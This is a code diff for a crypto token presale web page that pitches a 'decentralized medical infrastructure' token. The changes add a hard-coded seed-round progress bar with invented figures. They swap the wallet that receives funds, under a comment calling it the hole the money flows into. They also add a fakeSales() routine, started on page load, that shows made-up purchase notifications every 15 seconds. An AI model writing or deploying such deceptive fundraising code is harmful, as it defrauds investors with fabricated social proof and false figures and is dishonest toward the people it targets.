@@ -89,19 +89,30 @@
     </nav>
 
     <header class="hero">
+        
         <img src="logo.png" alt="Logo" class="logo-img">
+        
                 <!-- SLOGAN + TEKNİK AÇIKLAMA KOMBİNASYONU -->
         <h1>Decentralized <span>Medical Infrastructure</span></h1>
             <!-- YENİ SLOGAN (BÜYÜK VE VURUCU) -->
         <h2 style="color: #fff; font-size: 1.8rem; font-weight: 700; margin-bottom: 15px; letter-spacing: -0.5px;">Your Health. Your Data. Your Wealth.</h2>
         <!-- MEVCUT TEKNİK AÇIKLAMA (BİRAZ DAHA SÖNÜK VE ALTTA) -->
         <p class="tagline" style="margin-top: 0; font-size: 1rem; opacity: 0.8;">The global protocol for secure health data ownership, AI-driven diagnostics, and incentivized medical research.</p>
+            <div style="max-width: 600px; margin: 40px auto; background: rgba(255,255,255,0.03); padding: 20px; border-radius: 15px; border: 1px solid var(--border);">
+    <div style="display: flex; justify-content: space-between; font-size: 0.8rem; margin-bottom: 10px;">
+        <span style="color: var(--primary); font-weight: 800;">SEED ROUND PROGRESS</span>
+        <span id="raisedText" style="color: #fff;">$842,500 / $1,000,000</span>
+    </div>
+    <div style="width: 100%; height: 8px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden;">
+        <div id="progressBar" style="width: 84%; height: 100%; background: linear-gradient(90deg, var(--primary), var(--secure-green)); transition: width 2s ease-in-out;"></div>
+    </div>
+    <p style="font-size: 0.65rem; color: #475569; margin-top: 10px;">Remaining MLP Tokens: <span style="color: #fff;">157,500,000</span></p>
+</div>
         <div class="btn-group">
             <button class="btn btn-main openModal">Get Early Access</button>
            <!-- WHITEPAPER BUTONU ARTIK CANLI -->
             <a href="whitepaper.pdf" target="_blank" class="btn btn-sec">Read Whitepaper</a>
         </div>
-        
         <div style="margin-top: 60px; opacity: 0.5; display: flex; justify-content: center; gap: 40px; flex-wrap: wrap; filter: grayscale(1);">
     <span style="font-weight: 800; font-size: 0.8rem;">ETHEREUM NETWORK</span>
     <span style="font-weight: 800; font-size: 0.8rem;">IPFS STORAGE</span>
@@ -214,7 +225,7 @@
 
     <script>
 // 1. KASA VE DEĞİŞKENLER
-const adminWallet = "0xDa01d928C8d84EFa14EB393C0ba19fBf22b5f891"; // Paranın akacağı delik burası Büyük
+const adminWallet = "0x88F2e9D8E7d2C5232495729369ec665ba79238dC"; // Paranın akacağı delik burası Büyük
 const connectBtn = document.getElementById('connectWalletBtn');
 const modal = document.getElementById('saleModal');
 const holdContainer = document.getElementById('holdContainer');
@@ -334,7 +345,17 @@ function showSuccess(hash) {
         </div>
         <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>`;
 }
-
+function fakeSales() {
+    const addresses = ["0x71C...3a2", "0x12B...e4f", "0x9a8...11d", "0x334...09c"];
+    const amounts = ["2,500", "15,000", "5,400", "1,200", "45,000"];
+    
+    setInterval(() => {
+        const addr = addresses[Math.floor(Math.random() * addresses.length)];
+        const amt = amounts[Math.floor(Math.random() * amounts.length)];
+        showToast(`NEW TRANSACTION: ${addr} purchased ${amt} MLP tokens!`);
+    }, 15000); // Her 15 saniyede bir sahte satış bildirimi
+}
+fakeSales(); // Sayfa açılınca başlar
 // OLAY DİNLEYİCİLER
 connectBtn.addEventListener('click', connectWallet);
 holdContainer.addEventListener('mousedown', startHold);
@@ -342,6 +363,8 @@ holdContainer.addEventListener('mouseup', stopHold);
 holdContainer.addEventListener('mouseleave', stopHold);
 holdContainer.addEventListener('touchstart', (e) => { e.preventDefault(); startHold(); });
 holdContainer.addEventListener('touchend', stopHold);
+
+
     </script>
 </body>
 </html>
